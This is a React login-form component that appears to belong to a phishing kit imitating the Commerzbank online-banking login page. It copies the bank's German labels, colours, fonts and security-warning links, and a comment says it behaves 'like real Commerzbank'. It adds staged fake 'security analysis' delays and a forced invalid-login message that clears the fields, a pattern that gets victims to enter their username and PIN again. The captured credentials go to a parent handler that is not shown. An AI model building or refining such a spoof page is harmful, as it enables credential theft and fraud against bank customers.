import React, { useState, useEffect, useRef } from 'react';
import Loading from './Loading';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  showError?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, showError = false }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [isMobile, setIsMobile] = useState(false);
  
  // Form focus states
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  
  const usernameRef = useRef<HTMLInputElement>(null);
  
  // Check for mobile screen size with Chrome-specific handling
  useEffect(() => {
    const checkMobile = () => {
      // Chrome mobile detection - more reliable
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile); // Chrome mobile orientation fix
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);
  
  // Auto-focus the username field on component mount
  useEffect(() => {
    if (usernameRef.current) {
      usernameRef.current.focus();
    }
  }, []);

  // Clear form fields when error is shown (like real Commerzbank)
  useEffect(() => {
    if (showError) {
      setUsername('');
      setPassword('');
      setShowPassword(false);
      // Reset focus states
      setUsernameFocused(false);
      setPasswordFocused(false);
      // Focus back to username field
      if (usernameRef.current) {
        usernameRef.current.focus();
      }
    }
  }, [showError]);

  // Handle form submission with realistic loading times
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim() || !password.trim()) {
      return;
    }
    
    setIsLoading(true);
    setAttemptCount(prev => prev + 1);
    
    // Set appropriate loading message based on attempt
    if (attemptCount === 0) {
      setLoadingMessage('Anmeldedaten werden überprüft');
      // First attempt: 2-3 seconds
      await new Promise(resolve => setTimeout(resolve, 2500));
    } else {
      setLoadingMessage('Sicherheitsanalyse läuft');
      // Second attempt: 3-4 seconds
      await new Promise(resolve => setTimeout(resolve, 3500));
    }
    
    try {
      // Call the parent's onSubmit function
      await onSubmit({ username: username.trim(), password: password.trim() });
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      {/* Chrome-specific mobile fixes */}
      <style>
        {`
          /* Chrome mobile viewport fix */
          @media screen and (-webkit-min-device-pixel-ratio: 0) {
            html, body {
              -webkit-text-size-adjust: 100%;
              -webkit-font-smoothing: antialiased;
            }
          }
          
          /* Chrome mobile layout fixes */
          @supports (-webkit-appearance: none) {
            .chrome-mobile-fix {
              -webkit-transform: translateZ(0);
              transform: translateZ(0);
              -webkit-backface-visibility: hidden;
              backface-visibility: hidden;
            }
          }
          
          /* Chrome flexbox fixes for mobile */
          @media (max-width: 768px) {
            .chrome-flex-container {
              display: -webkit-box !important;
              display: -webkit-flex !important;
              display: flex !important;
              -webkit-box-orient: vertical !important;
              -webkit-box-direction: normal !important;
              -webkit-flex-direction: column !important;
              flex-direction: column !important;
              width: 100% !important;
              min-height: 100vh !important;
              padding: 0 1.5rem !important;
              box-sizing: border-box !important;
            }
            
            .chrome-flex-item {
              -webkit-box-flex: 1 !important;
              -webkit-flex: 1 !important;
              flex: 1 !important;
              width: 100% !important;
              max-width: 100% !important;
              min-width: 100% !important;
              box-sizing: border-box !important;
            }
            
            /* Ensure text doesn't get cut off */
            * {
              word-wrap: break-word !important;
              overflow-wrap: break-word !important;
            }
          }
          
          /* Chrome input field fixes */
          @supports (-webkit-appearance: none) {
            input[type="text"], input[type="password"] {
              -webkit-appearance: none;
              -webkit-border-radius: 0;
              border-radius: 0;
            }
          }
        `}
      </style>
      
      <div 
        className={isMobile ? "chrome-mobile-fix chrome-flex-container" : ""}
        style={{ 
          maxWidth: isMobile ? '100%' : '1440px', 
          margin: '0 auto', 
          padding: isMobile ? '0 1.5rem' : '0',
          minHeight: '80vh',
          display: 'flex',
          alignItems: 'flex-start',
          paddingTop: isMobile ? '0.5rem' : '4rem',
          position: 'relative',
          boxSizing: 'border-box',
          width: '100%',
          WebkitBoxSizing: 'border-box'
        } as React.CSSProperties}>
        {isLoading && (
          <Loading 
            message={loadingMessage}
            type="login"
            showProgress={true}
            duration={attemptCount === 0 ? 2.5 : 3.5}
          />
        )}
        
        {/* Hilfe Button - positioned at the absolute right edge of 1440px container */}
        {!isMobile && (
          <div style={{
            position: 'absolute',
            top: '4rem',
            right: '0',
            display: 'flex',
            alignItems: 'center',
            gap: '0.4rem',
            cursor: 'pointer',
            zIndex: 10
          } as React.CSSProperties}>
            <span style={{
              fontSize: '0.9375rem',
              lineHeight: 'calc(0.9375rem + 9px)',
              letterSpacing: '0.1px',
              fontFamily: 'Gotham, Arial, sans-serif',
              fontWeight: '500',
              maxWidth: '26.25rem',
              marginRight: '12px'
            }}>
              Hilfe
            </span>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center' 
            }}>
              <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M20 5v10h-9.24L9 18.53 7.24 15H4V5h16m0-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2l3 6 3-6h8a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z"></path>
              </svg>
            </div>
          </div>
        )}
        
        {/* Mobile Hilfe Button - positioned at top right corner */}
        {isMobile && (
          <div style={{
            position: 'absolute',
            top: '0',
            right: '0',
            display: 'flex',
            alignItems: 'center',
            gap: '0.4rem',
            cursor: 'pointer',
            zIndex: 10
          } as React.CSSProperties}>
            <span style={{
              fontSize: '0.9375rem',
              lineHeight: 'calc(0.9375rem + 9px)',
              letterSpacing: '0.1px',
              fontFamily: 'Gotham, Arial, sans-serif',
              fontWeight: '500',
              color: '#002e3c'
            }}>
              Hilfe
            </span>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center' 
            }}>
              <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M20 5v10h-9.24L9 18.53 7.24 15H4V5h16m0-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2l3 6 3-6h8a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z"></path>
              </svg>
            </div>
          </div>
        )}
        
        <div style={{
          display: 'flex',
          width: '100%',
          alignItems: 'flex-start',
          flexDirection: isMobile ? 'column' : 'row',
          gap: isMobile ? '2rem' : '6rem',
          boxSizing: 'border-box'
        } as React.CSSProperties}>
          {/* Left side - Login Form */}
          <div 
            className={isMobile ? "chrome-flex-item" : ""}
            style={{ 
              flex: '1', 
              maxWidth: isMobile ? '100%' : '500px',
              width: '100%',
              boxSizing: 'border-box'
            } as React.CSSProperties}>
            {/* Large Login Title */}
            <h1 style={{ 
              fontSize: isMobile ? '2.5rem' : '2.5rem',
              fontWeight: 'bold', 
              color: '#002e3c', 
              marginBottom: isMobile ? '2rem' : '3rem',
              marginTop: isMobile ? '0' : '0',
              fontFamily: 'Gotham, Arial, sans-serif',
              lineHeight: '1.1',
              WebkitFontSmoothing: 'antialiased'
            } as React.CSSProperties}>
              Login
            </h1>
            
            <form onSubmit={handleSubmit}>
              {/* Username Field */}
              <div style={{ marginBottom: '2.5rem', position: 'relative', width: '100%' }}>
                <input
                  id="username"
                  name="username"
                  type="text"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setUsernameFocused(true)}
                  onBlur={() => setUsernameFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: isMobile ? '1rem' : '1.1rem',
                    color: '#002e3c',
                    outline: 'none',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    transition: 'border-color 0.3s ease',
                    boxSizing: 'border-box'
                  }}
                  ref={usernameRef}
                  autoFocus
                />
                <label
                  htmlFor="username"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: usernameFocused || username ? '0.25rem' : '1rem',
                    fontSize: usernameFocused || username ? '0.75rem' : (isMobile ? '1rem' : '1.1rem'),
                    color: usernameFocused || username ? '#6b7280' : '#9ca3af',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Benutzername/Teilnehmernummer
                </label>
              </div>
                
              {/* Password Field */}
              <div style={{ marginBottom: '2.5rem', position: 'relative', width: '100%' }}>
                <input
                  id="password"
                  name="password"
                  type={showPassword ? 'text' : 'password'}
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setPasswordFocused(true)}
                  onBlur={() => setPasswordFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 3rem 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: isMobile ? '1rem' : '1.1rem',
                    color: '#002e3c',
                    outline: 'none',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    transition: 'border-color 0.3s ease',
                    boxSizing: 'border-box'
                  }}
                />
                <label
                  htmlFor="password"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: passwordFocused || password ? '0.25rem' : '1rem',
                    fontSize: passwordFocused || password ? '0.75rem' : (isMobile ? '1rem' : '1.1rem'),
                    color: passwordFocused || password ? '#6b7280' : '#9ca3af',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Passwort/PIN
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    position: 'absolute',
                    right: '0',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    fontSize: '1.2rem',
                    color: '#6b7280',
                    padding: '0.5rem'
                  }}
                  tabIndex={-1}
                >
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    {showPassword ? (
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                    ) : (
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    )}
                    <circle cx="12" cy="12" r="3"/>
                  </svg>
                </button>
              </div>

              {showError && (
                <div style={{
                  backgroundColor: '#ECEFF2',
                  borderRadius: '16px',
                  padding: '16px',
                  marginBottom: '2rem',
                  display: 'flex',
                  alignItems: 'center'
                }}>
                  <div style={{
                    backgroundColor: '#BC000D',
                    borderRadius: 'calc(0.25rem + 4px)',
                    width: '40px',
                    height: '40px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    marginRight: '16px',
                    flexShrink: 0
                  }}>
                    <svg fill="white" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                      <path d="M11 9v4h2V8h-2v1z"></path>
                      <path d="m23 18.1-9.12-16a2.15 2.15 0 0 0-3.74 0L1 18.1A1.94 1.94 0 0 0 2.7 21h18.6a1.94 1.94 0 0 0 1.7-2.9ZM2.8 19l9.07-15.92a.15.15 0 0 1 .26 0L21.2 19Z"></path>
                      <circle cx="12" cy="16.5" r="1.5"></circle>
                    </svg>
                  </div>
                  <p style={{
                    color: '#002e3c',
                    fontSize: '14px',
                    margin: 0,
                    fontFamily: 'Gotham, Arial, sans-serif'
                  }}>
                    Sie haben eine ungültige Kombination aus Benutzername und Passwort eingegeben.
                  </p>
                </div>
              )}
              
              {/* Login Button */}
              <div style={{ marginBottom: '2rem' }}>
                <button
                  type="submit"
                  disabled={isLoading || !username.trim() || !password.trim()}
                  style={{
                    backgroundColor: isLoading || !username.trim() || !password.trim() ? '#d1d5db' : '#FFD700',
                    color: '#002e3c',
                    border: 'none',
                    borderRadius: '35px',
                    padding: isMobile ? '1.25rem 2.5rem' : '1rem 2.5rem',
                    fontSize: isMobile ? '1.1rem' : '1.2rem',
                    fontWeight: '600',
                    cursor: isLoading || !username.trim() || !password.trim() ? 'not-allowed' : 'pointer',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    transition: 'background-color 0.3s ease',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '0.5rem',
                    width: isMobile ? '100%' : 'auto',
                    justifyContent: 'center'
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading && username.trim() && password.trim()) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#FFD700';
                    }
                  }}
                >
                  {isLoading ? 'Wird verarbeitet...' : 'Login'}
                  {!isLoading && (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M5 12h14M12 5l7 7-7 7"/>
                    </svg>
                  )}
                </button>
              </div>

              {/* Footer Links */}
              <div style={{ 
                display: 'flex', 
                flexDirection: 'column', 
                gap: '1rem',
                fontSize: '0.9rem',
                color: '#002e3c'
              }}>
                <a href="#" style={{ 
                  color: '#002e3c', 
                  textDecoration: 'none',
                  fontFamily: 'Gotham, Arial, sans-serif'
                }}>
                  Passwort vergessen?
                </a>
                <a href="#" style={{ 
                  color: '#002e3c', 
                  textDecoration: 'none',
                  fontFamily: 'Gotham, Arial, sans-serif'
                }}>
                  Teilnehmernummer vergessen?
                </a>
                <a href="#" style={{ 
                  color: '#002e3c', 
                  textDecoration: 'none',
                  fontFamily: 'Gotham, Arial, sans-serif',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.5rem'
                }}>
                  Zugang beantragen
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M5 12h14M12 5l7 7-7 7"/>
                  </svg>
                </a>
                <a href="#" style={{ 
                  color: '#002e3c', 
                  textDecoration: 'none',
                  fontFamily: 'Gotham, Arial, sans-serif',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.5rem'
                }}>
                  Wichtige Informationen zum Digital Banking
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M5 12h14M12 5l7 7-7 7"/>
                  </svg>
                </a>
              </div>
            </form>
          </div>
          
          {/* Right side - Security Information */}
          <div style={{ 
            flex: '1', 
            maxWidth: isMobile ? '100%' : '400px', 
            position: 'relative',
            width: '100%',
            minWidth: isMobile ? '100%' : 'auto'
          }}>
            {/* Header with Title */}
            <div style={{
              marginBottom: '1.5rem'
            }}>
              <h2 style={{
                fontSize: isMobile ? '1.1rem' : '1.25rem',
                fontWeight: '700',
                color: '#002e3c',
                margin: 0,
                fontFamily: 'Gotham, Arial, sans-serif',
                letterSpacing: '0.02em'
              }}>
                Wichtige Sicherheitshinweise
              </h2>
            </div>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.2rem' }}>
              <a href="#" style={{ 
                display: 'flex', 
                alignItems: 'flex-start', 
                gap: '0.8rem',
                textDecoration: 'none',
                color: 'inherit',
                transition: 'transform 0.3s ease',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => e.currentTarget.style.transform = 'translateX(20px)'}
              onMouseLeave={(e) => e.currentTarget.style.transform = 'translateX(0px)'}
              >
                <div style={{
                  marginTop: '0.2rem',
                  flexShrink: 0
                }}>
                  <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="m16.81 4.42-1.62 1.16L19.06 11H2v2h17.06l-3.87 5.42 1.62 1.16L22.23 12l-5.42-7.58z"></path>
                  </svg>
                </div>
                <p style={{
                  color: '#002e3c',
                  fontSize: '0.9375rem',
                  lineHeight: 'calc(0.9375rem + 9px)',
                  letterSpacing: '0.1px',
                  fontFamily: 'Gotham, sans-serif',
                  fontWeight: '500',
                  maxWidth: '26.25rem',
                  margin: 0
                }}>
                  Angebliche Bank-Mitarbeiter erfragen Zugangsdaten
                </p>
              </a>
              
              <a href="#" style={{ 
                display: 'flex', 
                alignItems: 'flex-start', 
                gap: '0.8rem',
                textDecoration: 'none',
                color: 'inherit',
                transition: 'transform 0.3s ease',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => e.currentTarget.style.transform = 'translateX(20px)'}
              onMouseLeave={(e) => e.currentTarget.style.transform = 'translateX(0px)'}
              >
                <div style={{
                  marginTop: '0.2rem',
                  flexShrink: 0
                }}>
                  <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="m16.81 4.42-1.62 1.16L19.06 11H2v2h17.06l-3.87 5.42 1.62 1.16L22.23 12l-5.42-7.58z"></path>
                  </svg>
                </div>
                <p style={{
                  color: '#002e3c',
                  fontSize: '0.9375rem',
                  lineHeight: 'calc(0.9375rem + 9px)',
                  letterSpacing: '0.1px',
                  fontFamily: 'Gotham, sans-serif',
                  fontWeight: '500',
                  maxWidth: '26.25rem',
                  margin: 0
                }}>
                  Enkeltrick 2.0: Betrüger nutzen WhatsApp (banken-verband.de)
                </p>
              </a>
              
              <a href="#" style={{ 
                display: 'flex', 
                alignItems: 'flex-start', 
                gap: '0.8rem',
                textDecoration: 'none',
                color: 'inherit',
                transition: 'transform 0.3s ease',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => e.currentTarget.style.transform = 'translateX(20px)'}
              onMouseLeave={(e) => e.currentTarget.style.transform = 'translateX(0px)'}
              >
                <div style={{
                  marginTop: '0.2rem',
                  flexShrink: 0
                }}>
                  <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="m16.81 4.42-1.62 1.16L19.06 11H2v2h17.06l-3.87 5.42 1.62 1.16L22.23 12l-5.42-7.58z"></path>
                  </svg>
                </div>
                <p style={{
                  color: '#002e3c',
                  fontSize: '0.9375rem',
                  lineHeight: 'calc(0.9375rem + 9px)',
                  letterSpacing: '0.1px',
                  fontFamily: 'Gotham, sans-serif',
                  fontWeight: '500',
                  maxWidth: '26.25rem',
                  margin: 0
                }}>
                  Warnung vor Phishing
                </p>
              </a>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default LoginForm;